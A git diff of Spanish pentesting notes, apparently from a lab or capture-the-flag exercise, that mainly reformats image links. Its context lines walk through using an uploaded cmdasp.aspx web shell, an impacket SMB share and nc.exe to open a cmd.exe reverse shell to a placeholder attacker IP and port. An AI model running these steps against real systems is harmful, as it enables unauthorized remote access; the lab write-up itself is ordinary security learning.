@@ -60,14 +60,18 @@ put (NOMBRE_ARCHIVO)
 ![](../Imagenes/Pasted%20image%2020250104194948.png)
 
 - Si lo ponemos en la URL nos saldra el archivo:
-![[Pasted image 20250104195041.png]]
+
+![](../Imagenes/Pasted%20image%2020250104195041.png)
+
 - Hacemos una web shell.
 	- Lo vamos a hacer levantando un recurso compartido.
 - Nos vamos a kali, buscamos nc.exe
 ```
 find / -name nc.exe 2>/dev/null
 ```
-![[Pasted image 20250104195337.png]]
+
+![](../Imagenes/Pasted%20image%2020250104195337.png)
+
 - Copiamos el segundo y lo llevamos a Desktop
 - Ahora vamos  a levantar un recurso compartido desde la maquina Kali.
 - Vamos  a usar la herramienta impacket-smbserver.
@@ -78,13 +82,19 @@ find / -name nc.exe 2>/dev/null
 ```
 impacket-smbserver (NOMBRE_RECURSO) $(pwd) -smb2support
 ```
-![[Pasted image 20250104195927.png]]
+
+![](../Imagenes/Pasted%20image%2020250104195927.png)
+
 - Ahora ponemos en escucha.
-![[Pasted image 20250104200027.png]]
+
+![](../Imagenes/Pasted%20image%2020250104200027.png)
+
 - Vamos al navegador al cmdasp.aspx donde podemos ejecutar comando y ponemos lo siguiente:
 ```
 \\(IP_ATACANTE)\(NOMBRE_RECURSO)\(ARCHIVO_SUBIR) -e cmd.exe (IP_ATACANTE) (PUERTO)
 ```
 -e --> Le decimos que queremos hacer una reverse shell, una cmd.exe a mi maquina atacante por el puerto especificado.
-![[Pasted image 20250104200734.png]]
+
+![](../Imagenes/Pasted%20image%2020250104200734.png)
+
 - Ya estamos dentro.
